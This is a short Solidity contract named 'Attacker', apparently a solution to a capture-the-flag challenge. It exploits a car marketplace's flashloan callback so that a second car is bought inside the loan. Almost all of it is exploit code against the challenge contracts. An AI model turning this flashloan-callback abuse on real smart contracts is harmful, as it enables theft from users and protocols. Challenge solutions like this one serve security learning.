// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./interfaces/ICarToken.sol";
import "./interfaces/ICarMarket.sol";

/**
* @title Attacker 
* @author kyrers
* @notice Execute the flashloan
*/
contract Attacker {
    /*------------------------------------------------------------
                                 VARIABLES
    --------------------------------------------------------------*/
    ICarToken private carToken;
    ICarMarket  private carMarket;

    /**
    * @notice Constructor
    */
    constructor(address _carToken, address _carMarket) {
        require(_carToken != address(0) && _carMarket != address(0), "No zero addresses");
        carToken = ICarToken(_carToken);
        carMarket = ICarMarket(_carMarket);
    }

    /**
    * @notice Attack
    */
    function Attack(address _carMarketOwner) external {
        //mint & approve
        carToken.mint();
        carToken.approve(_carMarketOwner, 1);
        //purchase
        carMarket.purchaseCar("black", "Rolls Royce", "Phantom Drophead");
        //flashloan
        (bool success, ) = address(carMarket).call(abi.encodeWithSignature("flashloan(uint256)", 1));
        //purchase
        //payback
    }

    function receivedCarToken(address _carFactory) external {
        carMarket.purchaseCar("black", "Rolls Royce", "Wraith Black Badge");
        carToken.transfer(_carFactory, 1);
    }
}